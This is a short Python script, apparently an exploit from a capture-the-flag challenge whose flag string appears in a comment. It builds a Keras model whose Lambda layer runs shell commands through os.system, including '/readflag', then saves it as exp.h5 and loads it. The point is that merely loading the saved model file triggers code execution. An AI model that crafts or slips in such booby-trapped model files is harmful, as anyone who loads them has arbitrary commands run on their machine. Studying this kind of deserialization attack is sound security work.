import os
import keras
from keras.models import Sequential
from keras.layers import Dense, Activation, Lambda

# rwctf{Names_characters_business_events_and_incidents_are_the_products_of_the_authors_imagination_Any_resemblance_to_actual_persons_living_or_dead_or_actual_events_is_purely_coincidental}

def antirectifier(x):
    # __import__('os').system('echo hahahahah')
    sys = __import__('sys')
    sys.stdout.write('hahahah\n')
    sys.stderr.write('errrr\n')
    os = __import__('os')
    os.system('/readflag')
    os.system('/readflag >&2')
    return x

def antirectifier_output_shape(input_shape):
    shape = list(input_shape)
    shape[-1] *= 2
    return tuple(shape)

model = Sequential([
    Dense(32, input_shape=(784,)),
    Activation('relu'),
    Dense(10),
    Activation('softmax'),
])

model.add(Lambda(antirectifier, output_shape=antirectifier_output_shape))

model.save('exp.h5')

keras.models.load_model('exp.h5')

# __import__('IPython').embed()
